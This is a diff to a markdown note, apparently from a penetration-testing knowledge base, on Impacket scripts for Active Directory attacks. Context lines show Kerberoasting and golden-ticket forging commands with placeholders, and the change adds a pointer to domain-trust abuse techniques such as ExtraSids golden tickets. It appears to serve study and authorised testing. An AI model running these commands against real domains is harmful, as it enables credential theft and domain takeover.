@@ -29,10 +29,10 @@ impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile 
 impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain <domain> Administrator
 ```
 
-> [!note] **See also** — [[Services/Active Directory/Kerberos|Kerberos]] for the full methodology these scripts implement (AS-REP Roasting, Kerberoasting, Golden/Silver Ticket, delegation abuse).
+> [!note] **See also** — [[Services/Active Directory/Kerberos|Kerberos]] for the full methodology these scripts implement (AS-REP Roasting, Kerberoasting, Golden/Silver Ticket, delegation abuse). Also [[Services/Active Directory/Domain Trusts|Domain Trusts]] — `raiseChild` (auto child→forest-root), `ticketer -extra-sid` (ExtraSids golden ticket), and `lookupsid` for cross-domain SID enumeration.
 
 ---
 
 *Created: 2026-07-27*
-*Updated: 2026-07-27*
+*Updated: 2026-09-25*
 *Model: claude-sonnet-5*
